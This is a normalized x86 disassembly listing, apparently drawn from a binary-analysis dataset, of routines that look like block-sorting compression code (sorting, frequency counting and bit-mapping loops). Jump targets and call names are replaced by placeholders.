mov [ ebp - 0x5c ] ecx
mov [ ebp - 0x4c ] edx
mov [ ebp - 0x40 ] eax
mov [ ebp - 0x28 ] 0x31
mov [ ebp - 0x14 ] ecx
mov eax [ ebp - 0x10 ]
inc eax
cmp eax [ ebp - 0x60 ]
mov [ ebp - 0x10 ] eax
jl r-xdata
mov esi eax
and [ ebp - 0x10 ] 0x0
lea esi [ ebx + 0x40 ]
mov eax esi
mov eax [ ebp - 0x18 ]
cmp eax [ ebp - 0x30 ]
jge r-xdata
cmp [ ebp - 0x54 ] 0x1
jne r-xdata
add [ ebp - 0x20 ] eax
jmp r-xdata
cmp [ ebp - 0x20 ] edx
jle r-xdata
cmp esi edx
jle r-xdata
cmp ecx [ ebp - 0x18 ]
jg r-xdata
dec edi
cmp edi 0x10
jae r-xdata
add eax eax
cmp [ ebp - 0x28 ] 0x0
mov [ ebp - 0x74 ] eax
jne r-xdata
mov ecx [ ebp - 0x20 ]
lea ecx [ ecx + eax * 2 ]
mov [ ebp - 0x20 ] ecx
mov edi [ ebp - 0x54 ]
cmp edi [ ebp - 0x64 ]
je r-xdata
mov ecx [ ebp - 0x18 ]
mov eax [ ebp - 0x18 ]
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] 0xff
jle r-xdata
mov esi edi
shr esi 0x4
lea eax [ ebx + esi * 4 + 0x1e7c ]
mov edx [ eax ]
and edi 0xf
add edi edx
cmp edi edx
mov cl [ ebx + edi + 0xe7c ]
jle r-xdata
mov edx [ ebx + 0x1e7c ]
lea eax [ ebx + edx ]
mov cl [ eax + edi + 0xe7c ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x55 ] cl
cmp edi 0x3
jbe r-xdata
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x50 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
mov esi [ ebx + 0xc4c ]
mov [ esi + ecx * 4 ] eax
inc ecx
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] ecx
jg r-xdata
mov edi [ ebx + 0xc50 ]
movzx si cl
mov [ edi + eax * 2 ] si
inc eax
dec [ ebp - 0x20 ]
cmp [ ebp - 0x20 ] edx
mov [ ebp - 0x18 ] eax
jg r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
and [ ebx + 0x444 ] 0x0
mov edx 0x100
lea eax [ ebx + 0x448 ]
mov ecx edx
mov edi eax
[ edi ] [ esi ]
mov ecx edx
inc [ eax ]
test esi esi
jle r-xdata
lea edx [ ebx + 0xe7c ]
test edi edi
jbe r-xdata
lea ecx [ ebx + 0xe7b ]
lea eax [ ecx + edx ]
mov edx ebx
sub edx ecx
add edx 0xe7c
mov [ ebp - 0x68 ] edx
mov edx ebx
sub edx ecx
add edx 0xe7a
mov [ ebp - 0x7c ] edx
mov edx ebx
sub edx ecx
add edx 0xe78
mov [ ebp - 0x78 ] edx
mov edx ebx
sub edx ecx
lea esi [ edi - 0x4 ]
add edx 0xe79
shr esi 0x2
add eax edi
mov [ ebp - 0x38 ] edx
inc esi
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] eax
cmp ecx [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
cmp eax [ ebp - 0x30 ]
jge r-xdata
jmp r-xdata
mov esi [ eax - 0x4 ]
add [ eax ] esi
add eax 0x4
dec ecx
jne r-xdata
and [ ebp - 0x10 ] ecx
lea eax [ ebx + 0x444 ]
lea eax [ ebx + 0x1e7c ]
dec [ eax ]
mov edx [ eax ]
mov [ ebx + edx + 0xe7c ] cl
cmp [ eax ] 0x0
jne r-xdata
mov edi eax
mov al [ edx + edi - 0x1 ]
mov [ edx + edi ] al
dec edi
lea eax [ ebx + esi * 4 + 0x1e7c ]
cmp edi [ eax ]
jg r-xdata
mov [ eax + 0xe7c ] cl
jmp r-xdata
lea esi [ eax + 0xe7c ]
mov cl [ eax ]
mov edx [ ebp - 0x68 ]
mov [ edx + eax ] cl
mov ecx [ ebp - 0x7c ]
add ecx eax
mov dl [ ecx ]
mov [ eax ] dl
mov edx [ ebp - 0x38 ]
mov dl [ edx + eax ]
mov [ ecx ] dl
mov ecx [ ebp - 0x78 ]
mov cl [ ecx + eax ]
mov edx [ ebp - 0x38 ]
mov [ edx + eax ] cl
sub edi 0x4
sub eax 0x4
dec esi
jne r-xdata
mov eax [ ebp - 0xc ]
mov cl [ ebp - 0x55 ]
cmp ecx [ ebp - 0x18 ]
jg r-xdata
mov edx [ ebp - 0x18 ]
movzx eax cl
lea eax [ eax + ebx + 0xd7c ]
movzx ecx [ eax ]
lea ecx [ ebx + ecx * 4 + 0x40 ]
inc [ ecx ]
cmp [ ebx + 0x28 ] 0x0
je r-xdata
mov edi 0xfff
mov [ ebp - 0x38 ] 0xf
lea esi [ ebx + 0x1eb8 ]
dec [ edi ]
mov edx [ edi - 0x4 ]
mov eax [ edi ]
mov dl [ edx + ebx + 0xe8b ]
dec esi
sub edi 0x4
mov [ ebx + eax + 0xe7c ] dl
test esi esi
jg r-xdata
mov dl [ esi + edi - 0x1 ]
mov [ esi + edi ] dl
dec edi
jne r-xdata
inc [ ebp - 0x10 ]
add eax 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ eax ]
mov ecx [ ebx + 0xc4c ]
mov [ ecx + edx * 4 ] eax
movzx ax [ eax ]
mov ecx [ ebx + 0xc50 ]
mov [ ecx + edx * 2 ] ax
jmp r-xdata
mov eax [ ebp - 0x68 ]
mov edx [ esi ]
add eax ebx
mov al [ eax + edx + 0xe7c ]
mov [ edi + ebx + 0xe7c ] al
dec edi
dec [ ebp - 0x68 ]
jns r-xdata
dec [ ebp - 0x38 ]
lea eax [ edi + 0x1 ]
mov [ esi ] eax
sub esi 0x4
cmp [ ebp - 0x38 ] 0x0
jge r-xdata
mov ecx [ eax ]
test ecx ecx
jl r-xdata
xor eax eax
inc eax
mov [ ebp - 0x10 ] eax
lea ecx [ ebx + 0x444 ]
mov eax [ ebp - 0x5c ]
dec [ ebp - 0x28 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x24 ]
inc eax
cmp eax [ ebp - 0x50 ]
mov [ ebp - 0x24 ] eax
jge r-xdata
inc [ ebp - 0x18 ]
cmp [ ebp - 0x28 ] 0x0
jne r-xdata
mov [ ebp - 0x68 ] 0xf
inc [ ebp - 0x10 ]
add ecx 0x4
cmp [ ebp - 0x10 ] edx
jle r-xdata
movzx eax [ ebx + eax + 0x1ebc ]
mov ecx [ ebx + eax * 4 + 0xf9fc ]
mov [ ebp - 0x70 ] eax
imul eax eax 0x408
add eax ebx
mov [ ebp - 0x5c ] ecx
lea ecx [ eax + 0xb16c ]
mov [ ebp - 0x48 ] ecx
lea ecx [ eax + 0xe1cc ]
add eax 0xc99c
mov [ ebp - 0x28 ] 0x32
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x40 ] eax
mov esi [ ecx ]
cmp esi [ ecx + 0x4 ]
jg r-xdata
and [ ebx + 0xc ] 0x0
or [ ebx + 0xc60 ] 0xffffffff
push 0x2
pop ecx
cmp [ ebx + 0x30 ] ecx
mov [ ebx + 0x8 ] 0x0
mov [ ebx + 0x4 ] ecx
jl r-xdata
cmp [ ebx + 0x28 ] 0x0
je r-xdata
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
xor eax eax
pop ecx
inc eax
xor esi esi
cmp [ ebp - 0x18 ] esi
mov [ ebp - 0x10 ] esi
jle r-xdata
xor edx edx
cmp [ ebp - 0x18 ] edx
lea edi [ ebx + 0x848 ]
mov ecx 0x101
lea esi [ ebx + 0x444 ]
[ edi ] [ esi ]
jle r-xdata
mov ecx [ ebx + 0xc4c ]
mov edx [ ebx + 0x34 ]
mov edx [ ecx + edx * 4 ]
mov esi [ ebx + 0x24 ]
shr edx 0x8
imul esi esi 0x186a0
mov [ ebx + 0x38 ] edx
xor edx edx
mov [ ebx + 0x440 ] edx
cmp [ ebx + 0x10 ] dl
je r-xdata
mov edx [ ebx + 0xc4c ]
movzx ecx [ edx + esi * 4 ]
lea ecx [ ebx + ecx * 4 + 0x444 ]
mov edi [ ecx ]
lea edx [ edx + edi * 4 ]
mov edi esi
shl edi 0x8
or [ edx ] edi
inc [ ecx ]
inc esi
cmp esi [ ebp - 0x18 ]
jl r-xdata
mov edx [ ebx + 0x34 ]
mov esi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
movzx edi [ ecx + esi ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr edi cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and edi 0xf
shl edi 0x10
or edi ecx
jmp r-xdata
mov ecx [ ebx + 0xc50 ]
lea ecx [ ecx + edx * 2 ]
movzx esi [ ecx ]
lea esi [ ebx + esi * 4 + 0x848 ]
mov di [ esi ]
mov [ ecx ] di
test dl 0x1
jne r-xdata
mov edx [ ebx + 0x38 ]
cmp edx esi
jae r-xdata
mov [ ebx + 0x14 ] edx
mov [ ebx + 0x18 ] edx
mov edx [ ebx + 0x38 ]
cmp edx esi
jae r-xdata
mov [ ebp - 0x10 ] esi
mov esi [ ebx + 0xc54 ]
mov ecx edi
sar ecx 0x1
movzx esi [ esi + ecx ]
mov [ ebp - 0x38 ] ecx
mov [ ebp - 0x1c ] edi
and [ ebp - 0x1c ] eax
movzx ecx [ ebp - 0x1c ]
mov eax [ ebx + 0xc50 ]
shl cl 0x2
shr esi cl
lea eax [ eax + edi * 2 ]
movzx ecx [ eax ]
and esi 0xf
shl esi 0x10
or esi ecx
mov ecx [ ebp - 0x38 ]
mov [ eax ] dx
mov eax [ ebx + 0xc54 ]
add eax ecx
cmp [ ebp - 0x1c ] 0x0
jne r-xdata
mov ecx [ ebx + 0xc54 ]
mov eax edx
sar eax 0x1
lea edi [ eax + ecx ]
mov eax [ esi ]
mov ecx [ esi ]
sar eax 0xc
xor al [ edi ]
sar ecx 0xc
and al 0xf
xor al cl
mov [ edi ] al
xor eax eax
inc eax
mov edi [ ebx + 0xc54 ]
mov ecx edx
sar ecx 0x1
add edi ecx
mov cl [ edi ]
and cl 0xf0
or cl [ esi + 0x2 ]
mov [ edi ] cl
jmp r-xdata
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
jmp r-xdata
mov ecx [ ecx + edx * 4 ]
mov [ ebx + 0x38 ] ecx
shr [ ebx + 0x38 ] 0x8
movzx ecx cl
mov [ ebx + 0x3c ] ecx
mov [ ebx + 0x440 ] eax
mov ecx [ rw-data ]
mov [ ebx + 0x14 ] ecx
dec [ ebx + 0x14 ]
mov ecx [ ebx + 0x14 ]
xor edx edx
cmp ecx eax
sete dl
mov [ ebx + 0x18 ] eax
xor [ ebx + 0x3c ] edx
jmp r-xdata
mov ecx edx
sar ecx 0xc
xor cl [ eax ]
sar edx 0xc
and cl 0xf
xor cl dl
mov [ eax ] cl
mov cl [ eax ]
sar edx 0x10
and cl 0xf0
or dl cl
mov [ eax ] dl
jmp r-xdata
inc [ esi ]
inc edx
cmp edx [ ebp - 0x18 ]
jl r-xdata
xor eax eax
inc eax
mov eax [ ebx + 0x34 ]
xor ecx ecx
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x10 ] edx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
cmp [ ebx + 0x10 ] cl
je r-xdata
mov edx edi
mov edi esi
cmp edx [ ebx + 0x34 ]
jne r-xdata
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jae r-xdata
mov [ ebx + 0x14 ] ecx
mov [ ebx + 0x18 ] ecx
mov ecx [ ebx + 0x24 ]
imul ecx ecx 0x186a0
cmp eax ecx
jb r-xdata
xor eax eax
inc eax
lea eax [ ebx + 0x444 ]
push eax
push [ ebx + 0x34 ]
call sub_1001a257
mov edx [ ebx + 0xc54 ]
mov [ ebx + 0x3c ] eax
mov eax [ ebx + 0x34 ]
pop ecx
pop ecx
mov ecx eax
shr ecx 0x1
movzx edx [ ecx + edx ]
movzx ecx al
and cl 0x1
shl cl 0x2
shr edx cl
mov ecx [ ebx + 0xc50 ]
movzx eax [ ecx + eax * 2 ]
and edx 0xf
shl edx 0x10
or edx eax
mov [ ebx + 0x38 ] edx
mov [ ebx + 0x440 ] 0x1
jmp r-xdata
lea eax [ ebx + 0x444 ]
push eax
push [ ebx + 0x34 ]
call sub_1001a257
mov edx [ ebx + 0x34 ]
mov esi eax
pop ecx
mov [ ebx + 0x3c ] esi
mov eax edx
shr eax 0x1
pop ecx
mov ecx [ ebx + 0xc54 ]
movzx eax [ eax + ecx ]
movzx ecx dl
and cl 0x1
shl cl 0x2
shr eax cl
mov ecx [ ebx + 0xc50 ]
movzx ecx [ ecx + edx * 2 ]
and eax 0xf
shl eax 0x10
or eax ecx
xor ecx ecx
inc ecx
mov [ ebx + 0x38 ] eax
mov [ ebx + 0x440 ] ecx
mov eax [ rw-data ]
mov [ ebx + 0x14 ] eax
dec [ ebx + 0x14 ]
mov edi [ ebx + 0x14 ]
xor eax eax
cmp edi ecx
sete al
mov [ ebx + 0x18 ] ecx
xor eax esi
mov [ ebx + 0x3c ] eax
sub_1001e70b
push ebp
mov ebp esp
push ecx
mov edx [ ebp + 0xc ]
cmp [ ebp + 0x8 ] edx
je r-xdata
leave
retn
mov ecx edx
sub ecx [ ebp + 0x8 ]
push ebx
cmp ecx 0x3
push esi
jle r-xdata
mov edx [ ebp + 0xc ]
jmp r-xdata
add edx 0xfffffffc
jmp r-xdata
dec edx
cmp edx [ ebp + 0x8 ]
jge r-xdata
cmp edx [ ebp + 0x8 ]
jge r-xdata
mov ecx [ eax + edx * 4 ]
mov ebx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ edx + 0x1 ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ eax + edx * 4 ]
mov ebx [ edi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
lea ecx [ edx + 0x4 ]
jmp r-xdata
cmp ecx [ ebp + 0xc ]
jle r-xdata
cmp ecx [ ebp + 0xc ]
jle r-xdata
mov esi [ eax + ecx * 4 ]
cmp ebx [ edi + esi * 4 ]
jbe r-xdata
mov esi [ ebp - 0x4 ]
mov [ eax + ecx * 4 - 0x4 ] esi
mov esi [ eax + ecx * 4 ]
cmp ebx [ edi + esi * 4 ]
jbe r-xdata
mov esi [ ebp - 0x4 ]
mov [ eax + ecx * 4 - 0x10 ] esi
dec edx
mov [ eax + ecx * 4 - 0x4 ] esi
inc ecx
mov [ eax + ecx * 4 - 0x10 ] esi
add ecx 0x4
sub_1001e78d
push ebp
mov ebp esp
sub esp 0x344
and [ ebp - 0x18 ] 0x0
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp + 0xc ]
push ebx
mov [ ebp - 0x344 ] eax
mov [ ebp + 0xc ] 0x1
push edi
push 0x3ec
call sub_100196de
dec [ ebp + 0xc ]
mov eax [ ebp + 0xc ]
shl eax 0x2
lea ecx [ ebp + eax - 0x1b4 ]
lea eax [ ebp + eax - 0x344 ]
mov ebx [ eax ]
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] ecx
mov ecx [ ecx ]
mov eax ebx
sub eax ecx
cmp eax 0xa
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0xc ] ebx
jge r-xdata
mov eax [ ebp - 0x18 ]
imul eax eax 0x1dc5
inc eax
and eax 0x7fff
push 0x3
xor edx edx
pop edi
mov [ ebp - 0x18 ] eax
div edi
test edx edx
jne r-xdata
mov edi [ ebp + 0x8 ]
push ebx
push ecx
mov eax esi
call sub_1001e70b
pop ecx
pop ecx
jmp r-xdata
cmp edx 0x1
jne r-xdata
mov eax [ esi + ecx * 4 ]
jmp r-xdata
cmp [ ebp + 0xc ] 0x0
jg r-xdata
mov eax [ esi + ebx * 4 ]
lea eax [ ebx + ecx ]
sar eax 0x1
mov eax [ esi + eax * 4 ]
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ edx + eax * 4 ]
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] ecx
mov edi ecx
mov [ ebp - 0x10 ] ebx
mov eax ebx
cmp [ ebp + 0xc ] 0x63
jge r-xdata
pop edi
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
cmp [ ebp - 0x10 ] ecx
jl r-xdata
mov edx [ esi + edi * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
sub ecx [ ebp - 0x4 ]
jne r-xdata
mov ecx edi
sub ecx [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov ecx [ ebp - 0x8 ]
sub ecx [ ebp - 0x14 ]
mov edx [ ebp - 0x1c ]
cmp ecx edx
jge r-xdata
test ecx ecx
jle r-xdata
mov ecx [ ebp - 0x8 ]
mov ecx [ esi + ecx * 4 ]
mov [ esi + edi * 4 ] ecx
mov ecx [ ebp - 0x8 ]
inc [ ebp - 0x8 ]
inc edi
cmp edi eax
mov [ esi + ecx * 4 ] edx
jle r-xdata
mov [ ebp - 0x4 ] edx
test edx edx
jle r-xdata
mov edx ecx
inc edi
jmp r-xdata
cmp edi eax
jg r-xdata
jmp r-xdata
mov ecx [ ebp - 0x10 ]
mov edx ebx
sub edx [ ebp - 0x10 ]
sub ecx eax
cmp edx ecx
jge r-xdata
mov ecx [ ebp - 0x14 ]
mov ebx edi
sub ebx edx
lea ecx [ esi + ecx * 4 ]
lea edx [ esi + ebx * 4 ]
mov ebx [ ebp - 0xc ]
jmp r-xdata
mov ebx [ ebp - 0xc ]
mov edx [ esi + eax * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
sub ecx [ ebp - 0x4 ]
jne r-xdata
mov [ ebp - 0x4 ] ecx
test ecx ecx
jle r-xdata
mov ecx edx
mov ebx [ ecx ]
mov [ ebp - 0x8 ] ebx
mov ebx [ edx ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x8 ]
mov [ edx ] ebx
add ecx 0x4
add edx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov ebx [ ebp - 0xc ]
cmp edi eax
jg r-xdata
test ecx ecx
jl r-xdata
mov ecx [ ebp - 0x10 ]
dec [ ebp - 0x10 ]
lea ecx [ esi + ecx * 4 ]
mov ebx [ ecx ]
mov [ esi + eax * 4 ] ebx
mov [ ecx ] edx
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov ecx [ ebp - 0x1c ]
sub eax [ ebp - 0x10 ]
lea ecx [ ecx + edx - 0x1 ]
mov edi ecx
sub edi [ ebp - 0x14 ]
lea eax [ eax + ebx + 0x1 ]
mov edx ebx
sub edx eax
inc [ ebp + 0xc ]
cmp edi edx
jle r-xdata
lea edx [ esi + edi * 4 ]
mov edi ebx
sub edi ecx
lea ecx [ esi + edi * 4 + 0x4 ]
cmp edi eax
jg r-xdata
dec eax
cmp edi eax
jle r-xdata
mov edx [ ebp - 0x20 ]
mov [ edx ] eax
mov eax [ ebp + 0xc ]
mov edx [ ebp - 0x14 ]
shl eax 0x2
mov [ ebp + eax - 0x1b4 ] edx
mov [ ebp + eax - 0x344 ] ecx
mov edx [ ebp - 0x24 ]
mov [ edx ] ecx
mov ecx [ ebp + 0xc ]
shl ecx 0x2
mov [ ebp + ecx - 0x1b4 ] eax
mov [ ebp + ecx - 0x344 ] ebx
jmp r-xdata
mov edi [ edx ]
mov [ ebp - 0xc ] edi
mov edi [ ecx ]
mov [ edx ] edi
mov edi [ ebp - 0xc ]
mov [ ecx ] edi
add edx 0x4
add ecx 0x4
dec [ ebp - 0x4 ]
cmp [ ebp - 0x4 ] 0x0
jg r-xdata
mov edx [ esi + eax * 4 ]
mov ecx [ esi + edi * 4 ]
mov [ esi + edi * 4 ] edx
mov [ esi + eax * 4 ] ecx
inc edi
dec eax
inc [ ebp + 0xc ]
sub_1001e9c9
push ebp
mov ebp esp
sub esp 0x810
cmp [ ebp + 0x14 ] 0x4
push ebx
push esi
push edi
mov ebx eax
jl r-xdata
mov edx 0x101
xor eax eax
mov ecx edx
lea edi [ ebp - 0x410 ]
[ edi ]
mov eax [ ebp + 0x10 ]
xor esi esi
test eax eax
jle r-xdata
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
pop ecx
mov ecx 0x100
lea esi [ ebp - 0x410 ]
lea edi [ ebp - 0x810 ]
[ edi ] [ esi ]
xor esi esi
inc esi
mov ecx [ ebp + 0xc ]
movzx ecx [ esi + ecx ]
lea ecx [ ebp + ecx * 4 - 0x410 ]
inc [ ecx ]
inc esi
cmp esi eax
jl r-xdata
mov edi [ ebp + esi * 4 - 0x414 ]
lea ecx [ ebp + esi * 4 - 0x410 ]
add [ ecx ] edi
inc esi
cmp esi edx
jl r-xdata
xor edi edi
test eax eax
jle r-xdata
cdq
and edx 0x1f
add eax edx
sar eax 0x5
inc eax
inc eax
test eax eax
jle r-xdata
mov ecx [ ebp + 0xc ]
movzx ecx [ edi + ecx ]
lea edx [ ebp + ecx * 4 - 0x410 ]
mov ecx [ edx ]
dec ecx
mov [ edx ] ecx
mov edx [ ebp + 0x8 ]
mov [ edx + ecx * 4 ] edi
inc edi
cmp edi eax
jl r-xdata
xor edx edx
mov ecx eax
xor eax eax
mov edi ebx
[ edi ]
mov ecx [ ebp + edx * 4 - 0x410 ]
xor esi esi
mov eax ecx
and ecx 0x1f
inc esi
shl esi cl
sar eax 0x5
lea eax [ ebx + eax * 4 ]
or [ eax ] esi
inc edx
cmp edx 0x100
jl r-xdata
mov edx [ ebp + 0x10 ]
push 0x20
pop esi
xor edi edi
inc edi
mov ecx edx
and ecx 0x1f
shl edi cl
mov eax edx
sar eax 0x5
lea eax [ ebx + eax * 4 ]
or [ eax ] edi
lea ecx [ edx + 0x1 ]
xor edi edi
inc edi
mov eax ecx
and ecx 0x1f
shl edi cl
sar eax 0x5
lea eax [ ebx + eax * 4 ]
not edi
and [ eax ] edi
inc edx
inc edx
dec esi
jne r-xdata
mov [ ebp - 0x8 ] 0x1
xor edx edx
xor esi esi
cmp [ ebp + 0x10 ] edx
jle r-xdata
push [ ebp - 0x8 ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
and [ ebp - 0xc ] 0x0
or edi 0xffffffff
xor eax eax
mov ecx edx
and ecx 0x1f
inc eax
shl eax cl
mov ecx edx
sar ecx 0x5
test [ ebx + ecx * 4 ] eax
je r-xdata
xor esi esi
mov ecx eax
and ecx 0x1f
inc esi
shl esi cl
mov edx eax
sar edx 0x5
test [ ebx + edx * 4 ] esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + edx * 4 ]
sub eax [ ebp - 0x8 ]
jns r-xdata
mov esi edx
test ecx ecx
je r-xdata
mov ecx eax
sar ecx 0x5
mov edx [ ebx + ecx * 4 ]
push 0x1f
xor edi edi
mov ecx eax
pop esi
and ecx esi
inc edi
shl edi cl
test edx edi
je r-xdata
mov ecx [ ebp + 0xc ]
inc edx
cmp edx [ ebp + 0x10 ]
mov [ ecx + eax * 4 ] esi
jl r-xdata
add eax [ ebp + 0x10 ]
inc eax
lea ecx [ eax - 0x1 ]
cmp ecx [ ebp + 0x10 ]
mov [ ebp - 0x4 ] ecx
jge r-xdata
cmp edx 0xffffffff
jne r-xdata
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
mov ecx eax
and ecx esi
jmp r-xdata
xor edx edx
mov ecx eax
and ecx esi
inc edx
shl edx cl
mov ecx eax
sar ecx 0x5
test [ ebx + ecx * 4 ] edx
jne r-xdata
add eax 0x20
mov ecx eax
sar ecx 0x5
cmp [ ebx + ecx * 4 ] 0xffffffff
je r-xdata
mov eax [ ebp - 0x8 ]
add eax eax
cmp eax [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
jg r-xdata
push [ ebp - 0xc ]
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
add esp 0xc
xor esi esi
inc esi
shl esi cl
mov edx eax
sar edx 0x5
test [ ebx + edx * 4 ] esi
je r-xdata
inc eax
jmp r-xdata
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
cmp [ ebp - 0xc ] 0x0
jne r-xdata
test ecx ecx
je r-xdata
mov ecx eax
sar ecx 0x5
mov edx [ ebx + ecx * 4 ]
xor esi esi
mov ecx eax
and ecx 0x1f
inc esi
shl esi cl
test edx esi
jne r-xdata
xor esi esi
xor ecx ecx
xor edx edx
cmp [ ebp + 0x10 ] esi
jle r-xdata
push r--data
call sub_1002a56e
add eax 0x40
push eax
call sub_1002a723
pop ecx
pop ecx
cmp [ ebp + 0x14 ] 0x4
jl r-xdata
inc eax
mov ecx eax
and ecx 0x1f
lea edi [ eax - 0x1 ]
cmp edi [ ebp + 0x10 ]
jge r-xdata
test edx edx
jne r-xdata
pop edi
pop esi
pop ebx
leave
retn
lea eax [ ebp - 0x810 ]
mov eax [ ebp - 0x4 ]
cmp edi eax
jle r-xdata
xor edx edx
mov ecx eax
and ecx 0x1f
inc edx
shl edx cl
mov ecx eax
sar ecx 0x5
test [ ebx + ecx * 4 ] edx
je r-xdata
add eax 0x20
mov ecx eax
sar ecx 0x5
cmp [ ebx + ecx * 4 ] 0x0
je r-xdata
mov edi [ ebp + 0x8 ]
mov edi [ edi + edx * 4 ]
mov ebx [ ebp + 0xc ]
lea eax [ ebp + ecx * 4 - 0x810 ]
dec [ eax ]
inc edx
cmp edx [ ebp + 0x10 ]
mov [ ebx + edi ] cl
jl r-xdata
inc ecx
cmp [ ebp + ecx * 4 - 0x810 ] esi
je r-xdata
lea eax [ edi + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov esi [ ebp + 0x8 ]
mov ecx edi
sub ecx eax
push edi
push [ ebp + 0xc ]
lea ecx [ edx + ecx + 0x1 ]
mov [ ebp - 0xc ] ecx
call sub_1001e78d
mov edx [ ebp - 0x4 ]
pop ecx
pop ecx
or eax 0xffffffff
jmp r-xdata
inc eax
jmp r-xdata
cmp [ eax ] esi
jne r-xdata
cmp ecx 0x100
jl r-xdata
cmp edx edi
jle r-xdata
push 0x3ed
call sub_100196de
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + edx * 4 ]
mov esi [ ebp + 0xc ]
mov ecx [ esi + ecx * 4 ]
mov [ ebp - 0x4 ] ecx
cmp eax ecx
je r-xdata
jmp r-xdata
inc edx
xor esi esi
mov ecx edx
and ecx 0x1f
inc esi
mov eax edx
sar eax 0x5
shl esi cl
lea eax [ ebx + eax * 4 ]
or [ eax ] esi
mov eax [ ebp - 0x4 ]
sub_1001ed20
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi edx
mov dl [ edi + eax ]
mov bl [ esi + eax ]
cmp bl dl
je r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
sbb eax eax
neg eax
jmp r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
mov edx [ ebp + 0xc ]
inc edi
inc esi
add edx 0x8
mov [ ebp + 0x8 ] edx
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
inc esi
mov bl [ esi + eax ]
cmp bl dl
jne r-xdata
movzx edx [ ecx + edi * 2 ]
movzx ebx [ ecx + esi * 2 ]
cmp bx dx
jne r-xdata
inc edi
mov dl [ edi + eax ]
